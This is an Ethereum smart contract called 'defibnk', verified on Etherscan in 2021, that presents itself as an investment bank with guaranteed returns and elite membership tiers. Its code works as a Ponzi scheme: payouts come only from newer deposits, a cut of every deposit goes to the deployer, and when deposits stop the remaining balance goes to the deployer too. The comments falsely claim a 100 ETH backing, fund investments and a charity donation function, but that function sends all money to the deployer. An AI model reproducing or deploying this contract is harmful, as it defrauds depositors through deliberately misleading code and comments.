/**
 *Submitted for verification at Etherscan.io on 2021-06-28
*/

// SPDX-License-Identifier: MIT

pragma solidity^0.8.5;


contract defibnk {

    // Global Variables
    uint32 public lastPayout;
    uint public lastInvestment;
    uint public profitFromCrash;
    address []  investors;
        struct eliteinvestor {
    		address payable addr;
    		uint amount;
    	}
	eliteinvestor [] eliteinvestors;
    uint[] public investmentsMade;
    address payable private bnkfee;
    //address payable public lastcreditor;
    mapping (address => uint) affiliates;
    uint constant THREE_DAYS = 172800;
    uint8 public round;
    uint public totaleliteinvestors = 0;
    uint public percent = 4;
    //Every elite investor gets 4% return on his investment when a new member joins. Elite members become lifelong members and keep receiving interest.

    constructor () payable {
        // the defibnk is launched. Send 0.05 to 0.15 ETH and get guarenteed 10% return on your investment. Invest 0.15 to 0.5 ETH and get 50% return on your investment. Invest 0.5 to 5 ETH and become an Elite investor.
        profitFromCrash = 100 * 10**18;
        // The defibank is backed by a 100ETH balance. If no new investments are made within 36 hours, this fund will be sent to the last investor as a jackpot.
        bnkfee = payable(msg.sender);
        //a percentage of each investment is used to investment into other cryptocurrencies.  
        lastInvestment = block.timestamp;
        
    }

    function becomeInvestor(address affiliate) public payable returns (bool) {
        uint amount = msg.value;
        // check if the system already broke down. If for 36hrs no new investor joins then the system will break down.
        // 36h are on average = 172800
        if (lastInvestment + THREE_DAYS < block.timestamp) {
            //Return money to sender
            //lastcreditor = payable(msg.sender);
            payable(msg.sender).transfer(amount);
            // Sends all contract money to the last creditor
            payable (investors[investors.length - 1]).transfer(profitFromCrash);
            bnkfee.transfer(address(this).balance);
            // Reset contract state
            lastPayout = 0;
            lastInvestment = block.timestamp;
            profitFromCrash = 0;
            investors = new address payable [](0);
            investmentsMade = new uint[](0);
            round += 1;
            return false;
        }
        else {
            // investments from the silver members is 0.05 ETH to 0.25 ETH 
            if (amount >= 5* 10**16 && amount <= 15 * 10**16 ) {
                lastInvestment = block.timestamp;
                // register investment and his amount with 10% interest rate. Basic members get 10% investment return. 
                investors.push(msg.sender);
                investmentsMade.push(amount * 110 / 100);
                // The investment amount and reward have been noted down
                bnkfee.transfer(amount * 20/100);
                // building the jackpot (they will increase the value for the person seeing the crash coming)
                if (profitFromCrash < 1000 * 10**18) {
                    profitFromCrash += amount * 5/100;
                }
                // affiliates get 5% of the invested amount
                if(affiliates[affiliate] >= amount) {
                    payable(affiliate).transfer(amount * 5/100);
                }
                affiliates[msg.sender] += amount * 110 / 100;
                // the money will be used to invest in cryptocurrency funds and then the profit is distributed to our partners.
                if (investmentsMade[lastPayout] <= address(this).balance) {
                    payable(investors[lastPayout]).transfer(investmentsMade[lastPayout]);
                    affiliates[investors[lastPayout]] -= investmentsMade[lastPayout];
                    lastPayout += 1;
                }
                return true;
            }
            
            else if (amount >= 15 * 10**16 && amount <= 5 * 10**17 ) {
                // the System has received fresh money, it will survive at leat 36h more
                lastInvestment = block.timestamp;
                // register investment and his amount with 50% interest rate. Platinum members get 50% investment return. 
                investors.push(msg.sender);
                investmentsMade.push(amount * 150 / 100);
                bnkfee.transfer(amount * 15/100);
                if (profitFromCrash < 1000 * 10**18) {
                    profitFromCrash += amount * 5/100;
                }
                if(affiliates[affiliate] >= amount) {
                    payable(affiliate).transfer(amount * 5/100);
                }
                affiliates[msg.sender] += amount * 110 / 100;
               if (investmentsMade[lastPayout] <= address(this).balance) {
                    payable(investors[lastPayout]).transfer(investmentsMade[lastPayout]);
                    affiliates[investors[lastPayout]] -= investmentsMade[lastPayout];
                    lastPayout += 1;
                }
                return true;
            }
            else if (amount >= 5 * 10**17 && amount <= 5 * 10**18 ) {
                lastInvestment = block.timestamp;
                // register investment and his amount. Elite members get 1% return on each new elite member who joins.. 
                eliteinvestors.push(eliteinvestor(payable(msg.sender), msg.value));
                totaleliteinvestors += 1;
                bnkfee.transfer(amount * 15/100);
                if (profitFromCrash < 1000 * 10**18) {
                    profitFromCrash += amount * 5/100;
                }
                if(affiliates[affiliate] >= amount) {
                    payable(affiliate).transfer(amount * 5/100);
                }
                affiliates[msg.sender] += amount * 110 / 100;
                uint position = 0;
                
                while(position < totaleliteinvestors) {
                    uint payout = (eliteinvestors[position].amount)*percent/100;
                    if(payout > address(this).balance){
                        break;
                    }
                    eliteinvestors[position].addr.transfer(payout);
                    position += 1;
                }
                
                if (investmentsMade[lastPayout] <= address(this).balance) {
                    payable(investors[lastPayout]).transfer(investmentsMade[lastPayout]);
                    affiliates[investors[lastPayout]] -= investmentsMade[lastPayout];
                    lastPayout += 1;
                }
                return true;
            }
            else {
                payable(msg.sender).transfer(amount);
                return false;
            }
        }
    }

    // fallback function
    receive() external payable {
        becomeInvestor(address(0));
    }

    function totalDebt() private view returns (uint debt) {
        for(uint i=lastPayout; i<investmentsMade.length; i++){
            debt += investmentsMade[i];
        }
    }

    function totalPayedOut() public view returns (uint payout) {
        for(uint i=0; i<lastPayout; i++){
            payout += investmentsMade[i];
        }
    }

    // All money goes to charities and NGOs accross the world fighting to keep the earth free from global warming and pollution.
    function saveourearth() public payable {
        bnkfee.transfer(msg.value);
    }

    // Index fund investments run using the money invested into the bank.
    function inheritToNextGeneration(address nextGeneration) public {
        if (msg.sender == bnkfee) {
            bnkfee = payable (nextGeneration);
        }
    }

    function showinvestors() public view returns (address[] memory) {
        return investors;
    }
    
    function showEliteinvestors() public view returns (eliteinvestor[] memory) {
        return eliteinvestors;
    }

    function getinvestmentsMade() public view returns ( uint[] memory) {
        return investmentsMade;
    }
}